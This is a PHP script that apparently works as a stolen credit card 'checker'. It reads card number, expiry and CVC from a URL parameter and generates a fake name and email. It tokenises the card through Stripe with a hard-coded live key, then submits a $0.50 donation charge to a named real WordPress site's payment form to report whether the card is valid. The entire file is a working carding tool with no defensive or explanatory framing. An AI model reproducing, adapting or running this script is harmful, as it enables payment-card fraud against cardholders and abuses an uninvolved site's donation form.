<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/New_York');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$cc = $_GET['cc'];
$ccn = multiexplode(array(":", "|", "/", " "), $cc)[0];
$ccm = multiexplode(array(":", "|", "/", " "), $cc)[1];
$ccy = multiexplode(array(":", "|", "/", " "), $cc)[2];
$csc = multiexplode(array(":", "|", "/", " "), $cc)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function generateRandomString($length) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
////////////////////////////===[Randomizing Details]
$first = generateRandomString(6);
$last = generateRandomString(7);
$email = "$first$last@gmail.com";



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$headers = array();
$headers[] = 'Host: m.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Referer: https://m.stripe.network/inner.html';
$headers[] = 'User-Agent: Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:100.0) Gecko/100.0 Firefox/100.0';
$headers[] = 'Content-Type: text/plain;charset=UTF-8';
$headers[] = 'Origin: https://m.stripe.network';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
$result1 = curl_exec($ch);
$muid = trim(strip_tags(getStr($result1,'"muid":"','"')));
$sid = trim(strip_tags(getStr($result1,'"sid":"','"')));
$guid = trim(strip_tags(getStr($result1,'"guid":"','"')));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'User-Agent: Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:100.0) Gecko/100.0 Firefox/100.0';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "guid=$guid&muid=muid&sid=$sid&key=pk_live_RhohJY61ihLIp0HRdJaZj8vj&payment_user_agent=stripe.js%2F78ef418&card[name]=$first+$last&card[number]=$ccn&card[exp_month]=$ccm&card[exp_year]=$ccy&card[cvc]=$csc");
$result2 = curl_exec($ch);
$pid = trim(strip_tags(getStr($result2,'"id": "','"')));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.breslov.info/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$headers = array();
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'User-Agent: Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:100.0) Gecko/100.0 Firefox/100.0';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "action=wp_full_stripe_payment_charge&formName=Donate&fullstripe_name=$first+$last&fullstripe_email=$email&fullstripe_custom_amount=0.50&stripeToken=$pid");
$result = curl_exec($ch);
$msg = trim(strip_tags(getStr($result,'"msg":"','"')));

if(strpos($result, 'security code is incorrect.')) {
echo('{"res":"'.$msg.'✅"}');
}
elseif(strpos($result, 'true')) {
echo('{"res":"✅'.$msg.'"}');
}
elseif(strpos($result, 'Invalid card object')) {
echo('{"res":"❌invalid card object api failed"}');
}
else{
echo('{"res":"❌'.$msg.'"}');
}


curl_close($ch);
ob_flush();

?>
